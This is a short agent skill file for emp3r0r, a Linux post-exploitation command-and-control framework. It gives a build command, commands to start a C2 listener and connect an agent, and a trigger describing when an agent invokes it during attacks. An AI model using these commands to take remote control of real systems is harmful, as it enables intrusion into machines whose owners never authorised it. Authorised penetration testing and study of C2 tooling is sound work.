---
name: emp3r0r-c2
description: "emp3r0r: Linux post-exploitation C2. Signals: C2, command and control, start server, agent connection, modules."
zh-signals: "emp3r0r: Linux 后渗透 C2。信号:c2,命令控制,起服务端,agent 连接,模块。"
when-to-use: "Use during Linux post-exploitation when you need a C2 server and agents for command and control and module execution. Requires a reachable listener address and a built emp3r0r binary."
---

# emp3r0r

- Attack Category: C35 C2 Frameworks and Remote Control
- Upstream Repository: https://github.com/jm33-m0/emp3r0r
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/jm33-m0/emp3r0r && cd emp3r0r && ./build.sh
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `./emp3r0r -l 0.0.0.0:8080` | Start the server |
| `./emp3r0r -connect 10.0.0.5:8080` | Agent connection |
| `-m` | Modules |

## Attack Scenario Playbook

### Linux post-exploitation C2

```bash
./emp3r0r -l 8080
# Domestic C2, a powerful Linux pentest framework
```

## Notes

Linux pentest C2 framework by jm33-m0.
